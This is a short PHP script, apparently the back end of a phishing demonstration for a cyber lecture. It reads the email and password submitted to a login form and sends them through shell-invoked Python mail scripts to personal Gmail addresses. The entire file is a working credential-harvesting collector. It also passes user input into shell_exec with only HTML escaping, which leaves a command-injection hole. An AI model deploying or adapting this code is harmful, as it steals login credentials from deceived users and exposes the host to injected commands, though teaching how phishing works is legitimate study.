<?php
    $old_path = getcwd();
    chdir('/home/ariz/cyber_lecture/');
     $username =  htmlspecialchars($_POST["email"]);
     $password =  htmlspecialchars($_POST["pass"]);
    $cmd = './send_mail_deception.py arizigler@gmail.com ari.zigler@gmail.com "user_name:'. $username . ' password: ' . $password . '"';
    $cmd = './send_mail.py -a "Password" -f "ariz@shaldag.biz" -t "ari.zigler@gmail.com" -m  "user_name: '. $username . '<br> password: ' . $password . '"';
    $output = shell_exec($cmd);
?>
